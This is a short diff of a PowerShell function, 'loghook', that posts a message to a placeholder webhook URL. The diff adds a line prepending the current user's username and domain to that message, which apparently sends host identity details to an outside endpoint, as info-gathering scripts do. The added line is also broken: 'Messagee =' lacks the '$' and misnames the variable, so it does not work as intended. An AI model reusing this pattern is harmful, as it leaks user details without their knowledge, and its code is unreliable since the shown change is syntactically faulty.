@@ -8,7 +8,7 @@ function loghook {
 
     # Define the webhook URL
     $webhookUrl = "YOUR_WEBHOOK_HERE2"
-
+    Messagee = "$env:USERNAME - $env:USERDOMAIN `n $Message"
     # Create the payload
     $payload = @{
         content = $Message
